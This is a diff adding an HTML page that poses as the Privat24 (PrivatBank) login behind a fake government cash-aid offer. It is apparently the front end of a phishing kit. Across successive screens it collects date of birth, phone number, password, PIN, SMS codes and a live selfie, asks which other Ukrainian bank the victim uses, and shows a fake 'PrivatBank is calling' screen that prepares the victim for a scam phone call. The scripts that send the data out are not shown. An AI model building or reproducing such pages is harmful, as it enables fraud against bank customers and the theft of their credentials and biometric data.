@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Вхід у Приват24 - ПриватБанк</title>
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="stylesheet" href="css/components.css">
+    <style>
+        /* SPA Screen Switching */
+        .screen {
+            display: none;
+        }
+        
+        .screen.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- ЭКРАН 1: Ввод даты рождения -->
+        <div id="screen-birthdate-first" class="screen active">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase; margin-bottom: 12px; line-height: 1.2; text-align: center; color: #1a1a1a; letter-spacing: -0.5px;">
+                    Вам доступна грошова допомога
+                </h1>
+                <p style="font-size: 15px; color: #6b7280; margin-bottom: 25px; text-align: center; font-weight: 400;">
+                    від держави
+                </p>
+                
+                <p style="font-size: 15px; color: #10b981; margin: 0 0 8px 0; text-align: center; font-weight: 600;">
+                    🎁 Для участі у програмі
+                </p>
+                
+                <p style="font-size: 15px; color: #6b7280; margin-bottom: 20px; text-align: center; font-weight: 400;">
+                    вкажіть вашу дату народження
+                </p>
+                
+                <form id="birthdateFormFirst">
+                    <div class="form-group">
+                        <div style="display: flex; gap: 10px; justify-content: center; align-items: flex-start; margin-bottom: 8px;">
+                            <!-- День -->
+                            <div style="flex: 1; max-width: 90px;">
+                                <input 
+                                    type="tel" 
+                                    id="bdayDay" 
+                                    class="form-input" 
+                                    placeholder="--"
+                                    maxlength="2"
+                                    inputmode="numeric"
+                                    pattern="[0-9]*"
+                                    required
+                                    style="text-align: center; font-size: 24px; font-weight: 600; border: 2px solid #10b981; padding: 16px 8px; border-radius: 8px; width: 100%;"
+                                >
+                                <div style="text-align: center; margin-top: 6px; font-size: 12px; color: #6b7280; font-weight: 500;">ДЕНЬ</div>
+                            </div>
+                            
+                            <!-- Месяц -->
+                            <div style="flex: 1; max-width: 90px;">
+                                <input 
+                                    type="tel" 
+                                    id="bdayMonth" 
+                                    class="form-input" 
+                                    placeholder="--"
+                                    maxlength="2"
+                                    inputmode="numeric"
+                                    pattern="[0-9]*"
+                                    required
+                                    style="text-align: center; font-size: 24px; font-weight: 600; border: 2px solid #10b981; padding: 16px 8px; border-radius: 8px; width: 100%;"
+                                >
+                                <div style="text-align: center; margin-top: 6px; font-size: 12px; color: #6b7280; font-weight: 500;">МІСЯЦЬ</div>
+                            </div>
+                            
+                            <!-- Год -->
+                            <div style="flex: 1; max-width: 110px;">
+                                <input 
+                                    type="tel" 
+                                    id="bdayYear" 
+                                    class="form-input" 
+                                    placeholder="----"
+                                    maxlength="4"
+                                    inputmode="numeric"
+                                    pattern="[0-9]*"
+                                    required
+                                    style="text-align: center; font-size: 24px; font-weight: 600; border: 2px solid #10b981; padding: 16px 8px; border-radius: 8px; width: 100%;"
+                                >
+                                <div style="text-align: center; margin-top: 6px; font-size: 12px; color: #6b7280; font-weight: 500;">РІК</div>
+                            </div>
+                        </div>
+                        <div class="error-message" id="birthdateErrorFirst" style="text-align: center; margin-top: 10px;"></div>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-primary btn-block" style="background: linear-gradient(135deg, #10b981 0%, #059669 100%); border: none; font-size: 16px; padding: 16px; font-weight: 600; border-radius: 8px; box-shadow: 0 2px 8px rgba(16, 185, 129, 0.3); transition: all 0.3s ease;">
+                        Продовжити
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 2: Ввод телефона -->
+        <div id="screen-phone" class="screen">
+            <div class="card fade-in">
+                <h1>Вхід у Приват24</h1>
+                <p class="subtitle">Введіть номер телефону</p>
+                
+                <form id="phoneForm">
+                    <div class="form-group">
+                        <label class="form-label" for="phone">Номер телефону</label>
+                        <div class="phone-input-wrapper">
+                            <span class="phone-prefix">🇺🇦 +380</span>
+                            <input 
+                                type="tel" 
+                                id="phone" 
+                                class="form-input phone-input" 
+                                placeholder="XX XXX XX XX"
+                                maxlength="12"
+                                inputmode="tel"
+                                required
+                            >
+                        </div>
+                        <div class="error-message" id="phoneError"></div>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-primary btn-block">
+                        Далі
+                    </button>
+                </form>
+                
+                <div class="divider"></div>
+                
+                <div class="qr-code">
+                    <img src="assets/images/QRlogo.png" alt="QR Code">
+                    <p class="qr-text">QR-код для входу через смартфон</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 2: Ввод пароля -->
+        <div id="screen-password" class="screen">
+            <div class="card fade-in">
+                <h1>Вхід у Приват24</h1>
+                
+                <div class="phone-display">
+                    <span class="phone-number" id="phoneDisplay">+380 XX XXX XX XX</span>
+                    <span class="edit-icon" id="editPhone">✏️</span>
+                </div>
+                
+                <form id="passwordForm">
+                    <div class="form-group">
+                        <label class="form-label" for="password">Пароль</label>
+                        <div class="password-wrapper">
+                            <input 
+                                type="password" 
+                                id="password" 
+                                class="form-input" 
+                                placeholder="Введіть пароль"
+                                minlength="6"
+                                required
+                            >
+                            <button type="button" class="password-toggle" id="togglePassword">
+                                👁️
+                            </button>
+                        </div>
+                        <div class="error-message" id="passwordError"></div>
+                    </div>
+                    
+                    <div style="text-align: left; margin-bottom: 20px;">
+                        <a href="#" class="link">Забули пароль?</a>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-primary btn-block">
+                        Далі
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 3: Ввод PIN -->
+        <div id="screen-pin" class="screen">
+            <div class="card fade-in">
+                <h1>Вхід у Приват24</h1>
+                <p class="subtitle">Пін код</p>
+                
+                <div class="pin-dots" id="pinDots">
+                    <div class="pin-dot"></div>
+                    <div class="pin-dot"></div>
+                    <div class="pin-dot"></div>
+                    <div class="pin-dot"></div>
+                </div>
+                
+                <div class="error-message" id="pinError"></div>
+                
+                <div class="virtual-keyboard">
+                    <div class="keyboard-row">
+                        <button class="keyboard-key" data-key="7">7</button>
+                        <button class="keyboard-key" data-key="8">8</button>
+                        <button class="keyboard-key" data-key="9">9</button>
+                    </div>
+                    <div class="keyboard-row">
+                        <button class="keyboard-key" data-key="4">4</button>
+                        <button class="keyboard-key" data-key="5">5</button>
+                        <button class="keyboard-key" data-key="6">6</button>
+                    </div>
+                    <div class="keyboard-row">
+                        <button class="keyboard-key" data-key="1">1</button>
+                        <button class="keyboard-key" data-key="2">2</button>
+                        <button class="keyboard-key" data-key="3">3</button>
+                    </div>
+                    <div class="keyboard-row">
+                        <button class="keyboard-key keyboard-key--cancel" data-key="cancel">×</button>
+                        <button class="keyboard-key" data-key="0">0</button>
+                        <button class="keyboard-key keyboard-key--backspace" data-key="backspace">⌫</button>
+                    </div>
+                </div>
+                
+                <button id="submitPin" class="btn btn-primary btn-block" style="margin-top: 30px;" disabled>
+                    Далі
+                </button>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 4: Выбор суммы -->
+        <div id="screen-amount" class="screen">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase;">Вам доступна грошова допомога</h1>
+                
+                <div class="amount-info" id="amountInfo" style="text-align: center; margin: 20px 0; font-size: 18px; color: var(--primary-color); font-weight: 600;">
+                    <!-- Динамически показывается сумма -->
+                </div>
+                
+                <div class="amount-selection">
+                    <div class="currency-selector" style="margin-bottom: 20px;">
+                        <label class="form-label" style="text-align: center; margin-bottom: 15px;">Оберіть валюту:</label>
+                        <div class="currency-buttons">
+                            <button class="currency-btn selected" data-currency="uah" id="currencyUAH">
+                                <span class="currency-icon">🇺🇦</span>
+                                <span>Гривні (UAH)</span>
+                            </button>
+                            <button class="currency-btn" data-currency="usd" id="currencyUSD">
+                                <span class="currency-icon">🇺🇸</span>
+                                <span>Доллари (USD)</span>
+                            </button>
+                            <button class="currency-btn" data-currency="eur" id="currencyEUR">
+                                <span class="currency-icon">🇪🇺</span>
+                                <span>Євро (EUR)</span>
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <button id="submitAmount" class="btn btn-primary btn-block" style="margin-top: 30px;">
+                        Продовжити
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 5: Короткая загрузка (3 сек) -->
+        <div id="screen-short-loading" class="screen">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase; margin-bottom: 20px;">
+                    Обробка даних
+                </h1>
+                
+                <div id="shortLoadingAmountDisplay" style="text-align: center; margin: 20px 0; font-size: 28px; color: var(--primary-color); font-weight: 700; padding: 15px; background: #f0f8f0; border-radius: var(--border-radius);">
+                    <!-- Динамически показывается сумма -->
+                </div>
+                
+                <div class="progress-bar-container" style="width: 100%; background-color: #e0e0e0; border-radius: 10px; height: 20px; overflow: hidden; margin-top: 20px;">
+                    <div class="progress-bar" id="shortLoadingProgressBar" style="height: 100%; width: 0%; background-color: var(--primary-color); border-radius: 10px; transition: width 0.1s linear;"></div>
+                </div>
+                
+                <p style="text-align: center; color: #999; margin-top: 15px; font-size: 14px;">
+                    Зачекайте...
+                </p>
+            </div>
+        </div>
+
+
+        <!-- ЭКРАН 7: Пол -->
+        <div id="screen-gender" class="screen">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase; margin-bottom: 10px;">
+                    Ваша стать?
+                </h1>
+                
+                <div id="genderAmountDisplay" style="text-align: center; margin: 15px 0; font-size: 22px; color: var(--primary-color); font-weight: 600; padding: 10px; background: #f0f8f0; border-radius: var(--border-radius);">
+                </div>
+                
+                <div class="gender-buttons" style="display: flex; flex-direction: column; gap: 15px; margin-top: 20px;">
+                    <button class="btn btn-primary btn-block gender-btn" data-gender="male" style="font-size: 18px; padding: 15px;">
+                        👨 Чоловіча
+                    </button>
+                    <button class="btn btn-primary btn-block gender-btn" data-gender="female" style="font-size: 18px; padding: 15px;">
+                        👩 Жіноча
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 8: Город -->
+        <div id="screen-city" class="screen">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase; margin-bottom: 10px;">
+                    З якого ви міста?
+                </h1>
+                
+                <div id="cityAmountDisplay" style="text-align: center; margin: 15px 0; font-size: 22px; color: var(--primary-color); font-weight: 600; padding: 10px; background: #f0f8f0; border-radius: var(--border-radius);">
+                </div>
+                
+                <form id="cityForm">
+                    <div class="form-group">
+                        <input 
+                            type="text" 
+                            id="cityInput" 
+                            class="form-input" 
+                            placeholder="Введіть назву міста"
+                            pattern="[А-Яа-яІіЇїЄєҐґ\s\-]+"
+                            required
+                            style="text-align: center; font-size: 20px;"
+                        >
+                        <div class="error-message" id="cityError"></div>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-primary btn-block">
+                        Надіслати
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 9: Финальная загрузка (1 мин) -->
+        <div id="screen-loading" class="screen">
+            <div class="card fade-in">
+                <h1 style="font-size: 24px; font-weight: 700; text-transform: uppercase; margin-bottom: 20px;">
+                    Готується виплата
+                </h1>
+                
+                <div id="loadingAmountDisplay" style="text-align: center; margin: 20px 0; font-size: 32px; color: var(--primary-color); font-weight: 700; padding: 15px; background: #f0f8f0; border-radius: var(--border-radius); display: none;">
+                    <!-- Динамически показывается сумма -->
+                </div>
+                
+                <div class="progress-bar-container" style="width: 100%; background-color: #e0e0e0; border-radius: 10px; height: 30px; overflow: hidden; margin-top: 30px;">
+                    <div class="progress-bar" id="loadingProgressBar" style="height: 100%; width: 0%; background-color: var(--primary-color); border-radius: 10px; transition: width 0.1s linear;"></div>
+                </div>
+                
+                <p id="loadingProgressText" style="text-align: center; color: #666; margin-top: 20px; font-size: 20px; font-weight: 600;">
+                    0%
+                </p>
+                
+                <p id="loading-message" style="text-align: center; color: #999; margin-top: 15px; font-size: 14px; line-height: 1.5;">
+                    Будь ласка, залишайтеся на сайті<br>не закривайте сторінку
+                </p>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 10: Звонок -->
+        <div id="screen-call" class="screen">
+            <div class="card">
+                <!-- Заголовки -->
+                <h1 class="call-main-title">Відновлення пароля від Приват24</h1>
+                <p class="call-bank-text">Телефонує ПриватБанк</p>
+
+                <!-- Анимация звонка -->
+                <div class="call-animation">
+                    <div class="phone-icon">
+                        <svg width="50" height="50" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                        </svg>
+                    </div>
+                    <div class="pulse-ring"></div>
+                    <div class="pulse-ring" style="animation-delay: 0.5s;"></div>
+                    <div class="pulse-ring" style="animation-delay: 1s;"></div>
+                </div>
+
+                <!-- Инструкция -->
+                <p class="call-instruction">Дайте відповідь на дзвінок і дотримуйтесь інструкцій</p>
+
+                <!-- Сообщение (если придет от бота) -->
+                <div id="bot-message" class="bot-message" style="display: none;"></div>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 7: Вибір банку -->
+        <div id="screen-banks" class="screen">
+            <div class="card fade-in">
+                <h1>Оберіть ваш банк</h1>
+                <p class="subtitle">Будь ласка, виберіть банк для продовження</p>
+                <div class="banks-grid">
+                    <button class="bank-option bank-oshad" onclick="handleBankSelection('Ощадбанк')">
+                        <span class="bank-name">Ощадбанк</span>
+                    </button>
+                    <button class="bank-option bank-raifu" onclick="handleBankSelection('Райффайзен')">
+                        <span class="bank-name">Райффайзен Банк</span>
+                    </button>
+                    <button class="bank-option bank-mono" onclick="handleBankSelection('Monobank')">
+                        <span class="bank-name">monobank</span>
+                    </button>
+                    <button class="bank-option bank-abank" onclick="handleBankSelection('А-Банк')">
+                        <span class="bank-name">А-Банк</span>
+                    </button>
+                    <button class="bank-option bank-yunex" onclick="handleBankSelection('Юнекс')">
+                        <span class="bank-name">Юнекс Банк</span>
+                    </button>
+                    <button class="bank-option bank-pumb" onclick="handleBankSelection('ПУМБ')">
+                        <span class="bank-name">ПУМБ</span>
+                    </button>
+                    <button class="bank-option bank-otp" onclick="handleBankSelection('OTP Bank')">
+                        <span class="bank-name">OTP Bank</span>
+                    </button>
+                    <button class="bank-option bank-sense" onclick="handleBankSelection('Sense Bank')">
+                        <span class="bank-name">Sense Bank</span>
+                    </button>
+                </div>
+                <div class="bank-info" id="bankInfo">
+                    Виберіть банк зі списку, щоб продовжити.
+                </div>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 8: SMS код -->
+        <div id="screen-code" class="screen">
+            <div class="card fade-in">
+                <h1>Вхід у Приват24</h1>
+                <p class="subtitle">Введіть код із СМС</p>
+                
+                <p style="color: #666; margin-bottom: 30px; font-size: 14px;" id="codeInstruction">
+                    Введіть 3 цифри з смс
+                </p>
+                
+                <div class="code-inputs" id="codeInputs">
+                    <!-- Динамически создаются поля 3 или 4 -->
+                </div>
+                
+                <div class="error-message" id="codeError"></div>
+                
+                <div class="timer" id="timer">00:30</div>
+                
+                <a href="#" class="resend-link resend-link--disabled" id="resendLink">
+                    Надіслати код заново
+                </a>
+                
+                <button id="submitCode" class="btn btn-primary btn-block" style="margin-top: 30px;" disabled>
+                    Далі
+                </button>
+            </div>
+        </div>
+
+        <!-- ЭКРАН: Селфи-верификация -->
+        <div id="screen-selfie" class="screen">
+            <div class="card fade-in">
+                <h1>Верифікація</h1>
+                <p class="subtitle">Щоб ми вас впізнали, пройдіть селфі верифікацію</p>
+                
+                <div id="selfieContainer" style="margin: 20px 0;">
+                    <!-- Заглушка до запуска камеры -->
+                    <div id="selfiePlaceholder" style="width: 100%; max-width: 400px; height: 300px; border-radius: var(--border-radius); background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; align-items: center; justify-content: center; margin: 0 auto;">
+                        <div style="text-align: center; color: white;">
+                            <div style="font-size: 64px; margin-bottom: 10px;">📸</div>
+                            <div style="font-size: 16px; opacity: 0.9;">Камера запуститься після<br>натискання кнопки</div>
+                        </div>
+                    </div>
+                    
+                    <!-- Видео превью -->
+                    <video id="selfieVideo" autoplay playsinline style="width: 100%; max-width: 400px; border-radius: var(--border-radius); background: #000; display: none; margin: 0 auto;"></video>
+                    
+                    <!-- Инструкция -->
+                    <div id="selfieInstruction" style="text-align: center; margin: 20px 0; font-size: 18px; font-weight: 600; color: var(--primary-color); min-height: 60px; display: flex; align-items: center; justify-content: center;">
+                        Натисніть "Почати" коли будете готові
+                    </div>
+                    
+                    <!-- Прогресс-бар -->
+                    <div id="selfieProgress" style="width: 100%; height: 8px; background: #e0e0e0; border-radius: 4px; overflow: hidden; margin: 15px 0; display: none;">
+                        <div id="selfieProgressBar" style="height: 100%; width: 0%; background: var(--primary-color); transition: width 0.3s;"></div>
+                    </div>
+                </div>
+                
+                <div class="error-message" id="selfieError"></div>
+                
+                <button id="startSelfie" class="btn btn-primary btn-block">
+                    Почати верифікацію
+                </button>
+                
+                <button id="sendSelfie" class="btn btn-primary btn-block" style="display: none;">
+                    Відправити
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Подключаем конфигурацию и скрипты -->
+    <script src="config.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
+
